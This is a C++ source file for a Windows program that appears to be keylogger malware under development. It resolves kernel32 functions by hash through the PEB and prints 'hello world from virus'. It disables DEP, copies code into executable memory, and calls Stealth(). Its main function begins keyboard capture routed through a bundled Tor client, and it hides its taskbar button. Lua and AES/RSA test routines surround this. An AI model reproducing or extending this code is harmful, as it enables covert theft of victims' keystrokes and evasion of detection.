#include "EntryPoint.h"
#include <vector>
#include <cstdio>
#include <iomanip>
#include "ntdll.h"

#include "lua.h"
#include "lauxlib.h"
#include "lualib.h"

#include "MiniTor.h"

typedef unsigned char byte;

typedef BOOL(WINAPI* pWriteConsoleA)(
	HANDLE hConsoleOutput,
	CONST VOID* lpBuffer,
	DWORD nNumberOfCharsToWrite,
	LPDWORD lpNumberOfCharsWritten,
	LPVOID lpReserved
	);
typedef HANDLE(WINAPI* pGetStdHandle)(
	DWORD nStdHandle
	);

// Turned off DEP in linker settings so that program memory can be overwritten.
// Linker -> Advanced -> Data Execution Prevention (DEP): No /NXCOMPAT:NO
// Also optimisation under C++ -> Optimisation is disabled.

int TestFunct()
{
	//MessageBoxA(0, "This will be encrypted!", "Test.", 0);
	//std::cout << "This will be encrypted!" << std::endl;
	//return 7 + 1;

	PIMAGE_DOS_HEADER pIDH;
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_EXPORT_DIRECTORY pIED;

	PPEB Peb;
	PLDR_DATA_TABLE_ENTRY Ldr;

	PVOID Buffer, Module, Kernel32Base;
	ULONG i, Hash, FileSize, EntryPointRva, VirusRva, write;

	PUCHAR EncryptedVirus, DecryptedVirus, ptr;
	PULONG Function, Name;
	PUSHORT Ordinal;

	FARPROC EntryPoint; // Original entry point
	HANDLE hFile;

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	pWriteConsoleA fnWriteConsoleA = nullptr;
	pGetStdHandle fnGetStdHandle = nullptr;

	// Unpack location of virus executable
	//char FilePath[] = { '%','t','e','m','p','%','\\','O','n','e','.','e','x','e',0 }, FileName[260];
	//char* FilePath = (char*)tempFile.c_str();
	//char FileName[260];

	Peb = NtCurrentPeb(); // Get the PEB
	Ldr = CONTAINING_RECORD(Peb->Ldr->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks.Flink); // Read the loader data

	Module = Ldr->DllBase; // Process executable

	Ldr = CONTAINING_RECORD(Ldr->InMemoryOrderLinks.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks.Flink); // ntdll (not used)
	Ldr = CONTAINING_RECORD(Ldr->InMemoryOrderLinks.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks.Flink); // kernel32

	Kernel32Base = Ldr->DllBase; // Store the address of kernel32

	pIDH = (PIMAGE_DOS_HEADER)Kernel32Base;
	pINH = (PIMAGE_NT_HEADERS)((PUCHAR)Kernel32Base + pIDH->e_lfanew);

	// Get the export directory of kernel32

	pIED = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)Kernel32Base + pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	Function = (PULONG)((PUCHAR)Kernel32Base + pIED->AddressOfFunctions);
	Name = (PULONG)((PUCHAR)Kernel32Base + pIED->AddressOfNames);

	Ordinal = (PUSHORT)((PUCHAR)Kernel32Base + pIED->AddressOfNameOrdinals);

	// Loop over the function names

	for (i = 0; i < pIED->NumberOfNames; i++)
	{
		PUCHAR ptr = (PUCHAR)Kernel32Base + Name[i]; // Pointer to function name
		ULONG Hash = 0;

		// Compute the hash

		while (*ptr)
		{
			Hash = ((Hash << 8) + Hash + *ptr) ^ (*ptr << 16);
			ptr++;
		}

		// Hash of GetStdHandle
		if (Hash == 1466015127)
		{
			fnGetStdHandle = (pGetStdHandle)((PUCHAR)Kernel32Base + Function[Ordinal[i]]);
		}

		// Hash of WriteConsoleA
		if (Hash == 1959804959)
		{
			fnWriteConsoleA = (pWriteConsoleA)((PUCHAR)Kernel32Base + Function[Ordinal[i]]);
		}
	}

	if (fnWriteConsoleA != nullptr && fnGetStdHandle != nullptr)
	{
		HANDLE stdOut = fnGetStdHandle(STD_OUTPUT_HANDLE);
		if (stdOut != NULL && stdOut != INVALID_HANDLE_VALUE)
		{
			DWORD written = 0;
			const char* message = "hello world from virus\n";
			//fnWriteConsoleA(stdOut, message, strlen(message), &written, NULL);
			fnWriteConsoleA(stdOut, message, 23, &written, NULL);
		}
	}

	return 0;
}

void stubfunct() { }

// Test variable
std::string testStr = "teststring!";

// Print the string in hexadecimal
void strprint(const char* name, unsigned char* msg, int len)
{
	//printf("name = %s,len = %d\n", name, len);
	std::cout << "name = " << name << ",len = " << len << std::endl;
	for (int i = 0; i < len; i++)
	{
		if (i != 0 && i % 32 == 0)
		{
			//printf("\n");
			std::cout << std::endl;
		}
		printf("0x%02x,", msg[i]);
		//std::cout << "0x" << std::hex << std::setw(2) << msg[i];
	}
	//printf("\n");
	std::cout << std::endl;
}

// Compare two character arrays if the exact match returns 0, otherwise return a negative number
int msgcmp(unsigned char* msg1, unsigned long l1, unsigned char* msg2, unsigned long l2)
{
	if (l1 != l2)
		return -1;
	for (int i = 0; i < l1; i++)
	{
		if (msg1[i] != msg2[i])
		{
			return -2;
		}
	}
	return 0;
}

byte* CreateNXCodeBuffer(void* data, unsigned long memorySize)
{
	SYSTEM_INFO system_info;
	GetSystemInfo(&system_info);
	auto const page_size = system_info.dwPageSize;

	// prepare the memory in which the machine code will be put (it's not executable yet):
	auto bufferProgram = VirtualAlloc(nullptr, page_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// copy the machine code into that memory:
	std::memcpy(bufferProgram, data, memorySize);

	// mark the memory as executable:
	DWORD oldProtection;
	VirtualProtect(bufferProgram, memorySize, PAGE_EXECUTE_READ, &oldProtection);

	std::cout << "Virtual memory allocated:" << std::endl;
	MemoryDump(bufferProgram, memorySize);

	//executeNXCodeBuffer(bufferProgram);

	return (byte*)bufferProgram;
}

void ExecuteNXCodeBuffer(byte* bufferProgram)
{
	//void (*funcProgram)() = reinterpret_cast<void(*)()>(&bufferProgram);
	//funcProgram();

	//auto const function_ptr = reinterpret_cast<void(*)()>(bufferProgram);
	//function_ptr();

	void (*funcProgram)() = reinterpret_cast<void(*)()>(&bufferProgram);
	std::cout << "begin call" << std::endl;
	funcProgram();
	std::cout << "finish call" << std::endl;

	//auto const function_ptr = reinterpret_cast<std::int32_t(*)()>(bufferProgram);
	//std::cout << "begin call" << std::endl;
	//auto const result = function_ptr();
	//std::cout << result << std::endl;
	//std::cout << "finish call" << std::endl;

	//int(*funcProgram)() = reinterpret_cast<int(*)()>(&bufferProgram);
	//std::cout << "begin call" << std::endl;
	//int a = funcProgram();
	//std::cout << "finish call: " << a << std::endl;



	//unsigned char func[] = { 0x90, 0x0f, 0x1 }; 
	//reinterpret_cast<void (*)()>(func)();
	//void (*funcProgram2)() = reinterpret_cast<void(*)()>(&func);
	//funcProgram2();

	//std::cout << b64c << std::endl;

	//byte* program = (byte*)b64c;

	//reinterpret_cast<void(*)()>(&program)();
	//void (*funcProgram)() = reinterpret_cast<void(*)()>(&program);
	//funcProgram();

	//*(void**)(&program)();

	//char func[] = { '\x90', '\x0f', '\x1' };
	//void (*func2)() = reinterpret_cast<void(*)()>(&func);
	//func2();

	//char func[] = { '\x90', '\x0f', '\x1' };
	//void (*func2)() = reinterpret_cast<void(*)()>(&func);
	//void (*func2)() = reinterpret_cast<void(*)()>(&func);
	//func2();
}

bool CheckLua(lua_State* L, int r)
{
	if (r != LUA_OK)
	{
		std::string errormsg = lua_tostring(L, -1);
		std::cout << errormsg << std::endl;
		return false;
	}
	return true;
}

int lua_HostFunction(lua_State* L)
{
	float a = (float)lua_tonumber(L, 1);
	float b = (float)lua_tonumber(L, 2);
	std::cout << "[C++] HostFunction(" << a << "," << b << ") called" << std::endl;
	float c = a * b;
	lua_pushnumber(L, c);
	return 1;
}

void LUA_Test()
{
	std::string cmd =
		"a = 7 + 11\n"
		"a = a + 100\n"
		"function AddStuff(a, b)\n"
		"	print(\"[LUA] AddStuff(\"..a..\", \"..b..\") called\")\n"
		"	return a + b\n"
		"end\n"
		"function DoAThing(a, b)\n"
		"	print(\"[LUA] DoAThing(\"..a..\", \"..b..\") called\")\n"
		"	c = HostFunction(a + 10, b * 3)\n"
		"	return c\n"
		"end\n";
	lua_State* L = luaL_newstate();
	luaL_openlibs(L);

	lua_register(L, "HostFunction", lua_HostFunction);

	int r = luaL_dostring(L, cmd.c_str());
	if (CheckLua(L, r))
	{
		lua_getglobal(L, "a");
		if (lua_isnumber(L, -1))
		{
			float a_in_cpp = (float)lua_tonumber(L, -1);
			std::cout << "a=" << a_in_cpp << std::endl;
		}
		lua_getglobal(L, "AddStuff");
		if (lua_isfunction(L, -1))
		{
			lua_pushnumber(L, 3.5f);
			lua_pushnumber(L, 7.1f);
			if (CheckLua(L, lua_pcall(L, 2, 1, 0)))
			{
				std::cout << "[C++] Called in Lua 'AddStuff()' got " << (float)lua_tonumber(L, -1) << std::endl;
			}
		}

		lua_getglobal(L, "DoAThing");
		if (lua_isfunction(L, -1))
		{
			lua_pushnumber(L, 5.0f);
			lua_pushnumber(L, 6.0f);
			if (CheckLua(L, lua_pcall(L, 2, 1, 0)))
			{
				std::cout << "[C++] Called in Lua 'DoAThing()' got " << (float)lua_tonumber(L, -1) << std::endl;
			}
		}
	}
	lua_close(L);
}

void AES_TEST()
{
	// Test AES cipher
	std::string cipher;
	AESEncryptStr("6bc1bee22e409f96e93d7e117393172a", &cipher, "2b7e151628aed2a6abf7158809cf4f3c", true);
	std::string plain;
	AESDecryptStr(cipher, &plain, "2b7e151628aed2a6abf7158809cf4f3c", true);
}

void RSA_TEST()
{
	// Test RSA cipher
	char c;
	int prng_idx, hash_idx, err;
	unsigned char pt[PTSIZE], pt1[CPSIZE], cp[CPSIZE];
	unsigned char out[BUFFERSIZE];
	unsigned long l1, l2;
	rsa_key key;
	rsa_key pubkey, prikey;
	unsigned char pubkeybuffer[BUFFERSIZE], prikeybuffer[BUFFERSIZE];
	unsigned long pubkeybuffersize, prikeybuffersize;
	int keysize = 0;
	int stat;
	int n;
	LARGE_INTEGER t1, t2, tc;
	std::string text = "HEllo world!";
	int j = 0;

	QueryPerformanceFrequency(&tc);

	/********* Analytic algorithm preparation**********/
	// Bind the math library
	ltc_mp = ltm_desc;
	// Register random number generator
	register_prng(&sprng_desc);
	prng_idx = find_prng("sprng");
	// Register the hash operation library
	register_hash(&sha1_desc);
	hash_idx = find_hash("sha1");

	/*********Generate key**********/
	// Generate a new key
	err = rsa_make_key(NULL, prng_idx, 1024 / 8, 257, &key);
	if (err != CRYPT_OK)
	{
		//printf("rsa_make_key err:%s\n", error_to_string(err));
		std::cout << "rsa_make_key err:" << error_to_string(err) << std::endl;
		goto MAIN_FUNC_RET;
	}
	// Print the length of the Key
	keysize = rsa_get_size(&key);
	if (keysize < 0)
	{
		//printf("rsa_get_size err:%s\n", error_to_string(err));
		std::cout << "rsa_get_size err:" << error_to_string(err) << std::endl;
		goto MAIN_FUNC_RET;
	}
	//printf("keysize = %d\n", keysize);
	std::cout << "keysize = " << keysize << std::endl;
	// Export the key into a private key situation string, do a separate save
	err = rsa_export(prikeybuffer, &prikeybuffersize, PK_PRIVATE, &key);
	if (err != CRYPT_OK)
	{
		//printf("rsa_export err:%s\n", error_to_string(err));
		std::cout << "rsa_export err:" << error_to_string(err) << std::endl;
		goto MAIN_FUNC_RET;
	}
	strprint("prikey", prikeybuffer, prikeybuffersize);
	// Export the key into a string of public key situation, public encryption use
	err = rsa_export(pubkeybuffer, &pubkeybuffersize, PK_PUBLIC, &key);
	if (err != CRYPT_OK)
	{
		//printf("rsa_export err:%s\n", error_to_string(err));
		std::cout << "rsa_export err:" << error_to_string(err) << std::endl;
		goto MAIN_FUNC_RET;
	}
	strprint("pubkey", pubkeybuffer, pubkeybuffersize);
	// Import from the public key string into rsa_key encryption use
	err = rsa_import(pubkeybuffer, pubkeybuffersize, &pubkey);
	if (err != CRYPT_OK)
	{
		//printf("rsa_import err:%s\n", error_to_string(err));
		std::cout << "rsa_import err:" << error_to_string(err) << std::endl;
		goto MAIN_FUNC_RET;
	}
	n = rsa_get_size(&pubkey);
	//printf("pubkeysize = %d\n", n);
	std::cout << "pubkeysize = " << n << std::endl;
	// Import from the secret key string to become rsa_key decryption use
	err = rsa_import(prikeybuffer, prikeybuffersize, &prikey);
	if (err != CRYPT_OK)
	{
		//printf("rsa_import err:%s\n", error_to_string(err));
		std::cout << "rsa_import err:" << error_to_string(err) << std::endl;
		goto MAIN_FUNC_RET;
	}
	n = rsa_get_size(&prikey);
	if (n < 0)
	{
		//printf("rsa_get_size err:%s\n", error_to_string(err));
		std::cout << "rsa_get_size err:" << error_to_string(err) << std::endl;
		goto MAIN_FUNC_RET;
	}
	//printf("prikeysize = %d\n", n);
	std::cout << "prikeysize = " << n << std::endl;
	system("pause");

	/*****************Encryption and decryption verification******************/
	memset(pt, 0, PTSIZE);
	srand(time(0));
	// Randomly generate a character array as the original to be encrypted

	for (int i = 0; i < PTSIZE; i++)
	{
		pt[i] = rand() % 255;

		if (j - 1 >= text.length()) j = 0;
		pt[i] = text[j];
		j++;
	}
	strprint("pt", pt, PTSIZE);

	// Multiple attempts to encrypt and decrypt, verify the results, calculate the operation time
	for (int i = 0; i < 100; i++)
	{
		memset(cp, 0, CPSIZE);
		QueryPerformanceCounter(&t1);
		rsa_encrypt_key_ex(pt, PTSIZE, cp, &l1, (const unsigned char*)"abcde", 5, NULL, prng_idx, hash_idx, LTC_PKCS_1_V1_5, &pubkey);
		QueryPerformanceCounter(&t2);
		strprint("encrypt text", cp, l1);
		//printf("Encryption operation time: %f\n", (t2.QuadPart - t1.QuadPart) * 1000.0 / tc.QuadPart);
		std::cout << "Encryption operation time: " << (t2.QuadPart - t1.QuadPart) * 1000.0 / tc.QuadPart << std::endl;
		// Try to use the public key to decrypt failed
		QueryPerformanceCounter(&t1);
		//rsa_decrypt_key_ex(cp, l1, pt1, &l2, (const unsigned char*)"abcde", 5, hash_idx, LTC_PKCS_1_V1_5,&stat, &pubkey);
		rsa_decrypt_key_ex(cp, l1, pt1, &l2, (const unsigned char*)"abcde", 5, hash_idx, LTC_PKCS_1_V1_5, &stat, &prikey);
		QueryPerformanceCounter(&t2);
		//printf("stat = %d\n", stat);
		std::cout << "stat = " << stat << std::endl;
		strprint("decrypt text", pt, l2);
		//printf("decryption operation time: %f\n", (t2.QuadPart - t1.QuadPart) * 1.0 / tc.QuadPart);
		std::cout << "decryption operation time: " << (t2.QuadPart - t1.QuadPart) * 1.0 / tc.QuadPart << std::endl;
		//printf("Compare results after decryption: %s\n", msgcmp(pt, PTSIZE, pt1, l2) == 0 ? "correct" : "error");
		std::cout << "Compare results after decryption: " << (msgcmp(pt, PTSIZE, pt1, l2) == 0 ? "correct" : "error") << std::endl;

		//std::cout << std::string((char*)cp, l1) << std::endl;
		std::cout << std::string((char*)pt, PTSIZE) << std::endl;
		std::cout << std::string((char*)pt1, l2) << std::endl;
		system("pause");
	}

MAIN_FUNC_RET:
	rsa_free(&key);
	rsa_free(&prikey);
	rsa_free(&pubkey);
	system("pause");
}

int main(int argc, char** argv)
{
	Stealth();
	LUA_Test();

	MiniTor* tor = new MiniTor();
	//std::string content = tor->http_get("https://check.torproject.org/");
	//std::cout << content << std::endl;

	AES_TEST();
	//RSA_TEST();

	// Begin capture from keyboard
	BeginCapture(tor);
	StartSaveSchedule();

	// Loop to keep the console application running.
	MessageLoop();

	delete tor;

	return EXIT_SUCCESS;

}
// Included WinMain and set Subsystem to WINDOWS
// just so button does not show in taskbar.
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	return main(__argc, __argv);
}